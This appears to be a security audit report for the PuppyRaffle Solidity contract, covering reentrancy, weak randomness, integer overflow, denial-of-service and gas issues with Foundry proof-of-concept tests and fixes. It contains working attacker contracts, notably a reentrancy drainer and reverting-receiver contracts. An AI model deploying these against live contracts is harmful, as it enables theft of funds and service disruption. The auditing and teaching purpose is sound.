
### [H-1] The external call to sendValue occurs before the state update on line `105`   `(players[playerIndex] = address(0))` Which can lead to re-entrancy vulnerabilities. 

**Description:**  The `PuppyRaffle::refund()` function during the refund process make an external call to `sendValue` before updating the state to reflect that the player has been refunded. This sequence of operations can lead to re-entrancy vulnerabilities, where a malicious contract could exploit the external call to re-enter the `refund` function before the state is updated, potentially allowing multiple refunds for the same player.

```javascript
// @audit Re-entrancy vulnerability
@>  Address.sendValue(payable(player), entranceFee);
        players[playerIndex] = address(0);  
```

**Impact:** This vulnerability could allow an attacker to drain all the funds from the `PuppyRaffle` contract by repeatedly calling the `refund` function before the player's address is set to `address(0)`, leading to significant financial loss for the contract.
This could undermine the integrity of the raffle system and result in loss of trust from participants.

**Proof of Concept:** 
Using a malicious contract, an attacker can call the `refund` function several times before the state is updated, allowing them to receive multiple refunds.
Place the following test into `PuppyRaffleTest.t.sol`.
<details><summary>PoC</summary>

```javascript
        function test_ReentrancyRefund() public {

              address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackercontract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance =  address (attackercontract).balance;
        uint256 startingContractBalance = address (puppyRaffle).balance;

        // Attack
        vm.prank(attackUser);
        attackercontract.attack{value: entranceFee}();

        console.log("Starting attacker contract balance:", startingAttackContractBalance);
        console.log("Ending attacker contract balance:", address (attackercontract).balance);
        console.log("Starting contract balance:", startingContractBalance);
        console.log("Ending contract balance:", address (puppyRaffle).balance);
      
    }
```    

```javascript

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor (PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();

    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value:entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
         if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

```
</details>

**Recommended Mitigation:**  To mitigate this vulnerability, it is recommended to follow the "Checks-Effects-Interactions" pattern. This involves updating the contract's state before making any external calls. Specifically, the line that updates the player's address to `address(0)` should be moved before the call to `sendValue`. This ensures that even if a re-entrant call is made, the state has already been updated to prevent multiple refunds.
  


### [H-2] Weak randomness in winner selection in `PuppyRaffle::selectWinner()` function.

**Description:**   The `PuppyRaffle::selectWinner()` function uses block attributes such as `block.timestamp` and `block.difficulty` along with `msg.sender` to generate randomness for selecting a winner. These values can be influenced by miners, making the randomness predictable and exploitable.

```javascript
 uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

**Impact:** This weak randomness can be exploited by malicious actors, including miners, who can manipulate block attributes to increase their chances of winning the raffle. This undermines the fairness of the raffle and can lead to loss of trust among participants.

**Proof of Concept:**

1. Validators can know ahed of the time `block.timestamp`  and `block.difficulty` use that to pridict the outcome of the raffle.
   
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner.

3. Users can revert their `selectWinner()` transaction if they don't like the winner or resulting puppy NFT.

**Recommended Mitigation:**  To mitigate this vulnerability, it is recommended to use a more secure source of randomness, such as Chainlink VRF (Verifiable Random Function) or another trusted randomness oracle. This ensures that the randomness used for selecting the winner is unpredictable and cannot be manipulated by miners or other participants.

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees.


**Description:** In Solidity versions prior to `0.8.0`, integer were subject to integer overflow.
        

```javascript
uint64 myVar = type(uint64).max;
myVar += 1; // myVar is now 0 due to overflow

```
**Impact:**  
In `PuppyRaffle::selectWinner()`, `totalFees` are acumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees()`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.


**Proof of Concept:**

1. We conclude a raffle of 4 players
2. We then have 89 players enters a new raffle, and conclude  the raffle
3. `totalFee` will be:

```javascript
totalFees = totalFees + uint64(fee);

toralFees = 800000000000000000 + 1780000000000000000 = 0 (overflow) 
```
4. You will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees()`:

```javascript
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
Although you could use selfdestruct to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.


<details><summary>PoC</summary>

```javascript
function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```
</details>

**Recommended Mitigation:** There are a few recommended mitigations here.

Use a newer version of Solidity that does not allow integer overflows by default.
```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```
Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's SafeMath to prevent integer overflows.

Use a uint256 instead of a uint64 for totalFees.
```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```
Remove the balance check in `PuppyRaffle::withdrawFees`
```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
We additionally want to bring your attention to another attack vector as a result of this line in a future finding.


### [H-4] Malicious winner can forever halt the raffle
<!-- TODO: This is not accurate, but there are some issues. This is likely a low. Users who don't have a fallback can't get their money and the TX will fail. -->

**Description:** Once the winner is chosen, the `selectWinner` function sends the prize to the the corresponding address with an external call to the winner account.

```javascript
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

If the `winner` account were a smart contract that did not implement a payable `fallback` or `receive` function, or these functions were included but reverted, the external call above would fail, and execution of the `selectWinner` function would halt. Therefore, the prize would never be distributed and the raffle would never be able to start a new round.

There's another attack vector that can be used to halt the raffle, leveraging the fact that the `selectWinner` function mints an NFT to the winner using the `_safeMint` function. This function, inherited from the `ERC721` contract, attempts to call the `onERC721Received` hook on the receiver if it is a smart contract. Reverting when the contract does not implement such function.

Therefore, an attacker can register a smart contract in the raffle that does not implement the `onERC721Received` hook expected. This will prevent minting the NFT and will revert the call to `selectWinner`.

**Impact:** In either case, because it'd be impossible to distribute the prize and start a new round, the raffle would be halted forever.

**Proof of Concept:** 

<details>
<summary>Proof Of Code</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
function testSelectWinnerDoS() public {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    address[] memory players = new address[](4);
    players[0] = address(new AttackerContract());
    players[1] = address(new AttackerContract());
    players[2] = address(new AttackerContract());
    players[3] = address(new AttackerContract());
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.expectRevert();
    puppyRaffle.selectWinner();
}
```

For example, the `AttackerContract` can be this:

```javascript
contract AttackerContract {
    // Implements a `receive` function that always reverts
    receive() external payable {
        revert();
    }
}
```

Or this:

```javascript
contract AttackerContract {
    // Implements a `receive` function to receive prize, but does not implement `onERC721Received` hook to receive the NFT.
    receive() external payable {}
}
```
</details>

**Recommended Mitigation:** Favor pull-payments over push-payments. This means modifying the `selectWinner` function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of `selectWinner`.


### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle()` is a potential Denial of Service (DoS) vulnerability.

**Description:** The `PuppyRaffle::enterRaffle()` function loop through the `players` array to check for duplicate. However, the longer the array gets, the more checks need to perform.
This cause the gas cost for players who entered earlier is less and the gas cost for players who entered later is more. Every additonal address in the `players` array, is the additional check for the loop.

```javascript
// @audit DoS attack
@>  for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas cost for raffle entrance will gradually increase as more players enter the raffle. Discouraging later users from entering the raffle and causing a rush at the start of the raffle.

An attacker might make the `PuppyRaffle::enterRaffle()` function too expensive to execute by entering a large number of unique addresses, effectively locking out all other users from entering the raffle.

**Proof of Concept:** 
If we have 2 set of 100 players entering the rafflef.
1st 100 players = 6503272 gas
2nd 100 players = 18995512 gas
lots of gas difference.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
        function test_dos()public{
        // address[] memory players = new address[](1);
        //players[0] = playerOne;
        //puppyRaffle.enterRaffle{value: entranceFee}(players);
        //assertEq(puppyRaffle.players(0), playerOne);

        uint256 num = 100;
        address[] memory players1 = new address[](num);
        for(uint256 i=0; i<num; i++){
            players1[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * num}(players1);
        uint256 gasEnd = gasleft();
        uint256 gasUsed = gasStart - gasEnd;
        console.log("gas used 1s", gasUsed);



        
        address[] memory players2 = new address[](num);
        for(uint256 i=0; i<num; i++){
            players2[i] = address(i+num);
        }
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * num}(players2);
        uint256 gasEnd2 = gasleft();
        uint256 gasUsed2 = gasStart2 - gasEnd2;
        console.log("gas used 2s", gasUsed2);

    }
```

</details>


**Recommended Mitigation:** There are some recommendetion like:
1. consider not having the duplicate check loop. Cause user can still enter but with diffrent address.
2. consider using a mapping instade of loop. This can help form DoS happening.


### [M-2] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

**Description:** The `PuppyRaffle::withdrawFees` function checks the `totalFees` equals the ETH balance of the contract (`address(this).balance`). Since this contract doesn't have a `payable` fallback or `receive` function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the `PuppyRaffle` contract, breaking this check. 

```javascript
    function withdrawFees() external {
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

**Impact:** This would prevent the `feeAddress` from withdrawing fees. A malicious user could see a `withdrawFee` transaction in the mempool, front-run it, and block the withdrawal by sending fees. 

**Proof of Concept:**

1. `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.
2. Malicious user sends 1 wei via a `selfdestruct`
3. `feeAddress` is no longer able to withdraw funds

**Recommended Mitigation:** Remove the balance check on the `PuppyRaffle::withdrawFees` function. 

```diff
    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated. 

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value. 

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:** 

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists. 

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart. 

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting. 

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:** 
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)

## Informational / Non-Critical 

### [I-1] Floating pragmas 

**Description:** Contracts should use strict versions of solidity. Locking the version ensures that contracts are not deployed with a different version of solidity than they were tested with. An incorrect version could lead to uninteded results. 

https://swcregistry.io/docs/SWC-103/

**Recommended Mitigation:** Lock up pragma versions.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity 0.7.6;
```
**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0. But according to the natspec, it will also return 0 if the player is not in the array.

```javascript 
   /// @return the index of the player in the array, if they are not active, it returns 0
 function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            } 
        }
        return 0;
    }
```


**Impact:** A player at index 0 may incorrectly think they have not entered the raffle. And attempt to enter raffle again, causing a duplicate entry error.

**Proof of Concept:**

1. User enters the reffle as the first player.
2. `PuppyRaffle::getActivePlayerIndex()` returns 0.
3. User thing they have not entered the raffle due to the function documentation.

**Recommended Mitigation:**   The easiest recommendation would be revert if the player is not in the array instead of returning 0. 

You could also reserve the 0th index for any competition, But a better solution might be return an `int256` where the function returns `-1` if the player is not active.

### [I-2]: Using an outdated version of solidity is not recommended.

Please use a newer version like 0.8.x to take advantage of the latest features, optimizations, and security improvements.

### [I-3]: Address State Variable Set Without Checks

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 177](src/PuppyRaffle.sol#L177)

	```solidity
	        feeAddress = newFeeAddress;
	```

</details>

### [I-4] `PuppyRaffle::selectWinner()` should follow the CEI (Checks-Effects-Interactions) pattern to prevent potential vulnerabilities.

**Description:** 
It's best to keep clean and follow CEI pattern.


**Recommended Mitigation:** 
```diff
-       (bool success,) = winner.call{value: prizePool}("");
-        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");
```


### [I-5] Use of "magic" numbers is descouraged.
 
 It can be confusing to see numbers literals in codebase, and it's much more readable if the number has a name.
 

# Gas

### [G-1] Unchanged state variable should be declared as constant or immutable to save gas.

Reading from storage is much more expensive then reading from constant or immutable variables.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable` 
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loop should be cached in memory to save gas.

Every time you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

```diff
+    uint256 playersLength = players.length;   
-    for (uint256 i = 0; i < players.length - 1; i++) {
+    for (uint256 i = 0; i < playersLength - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```



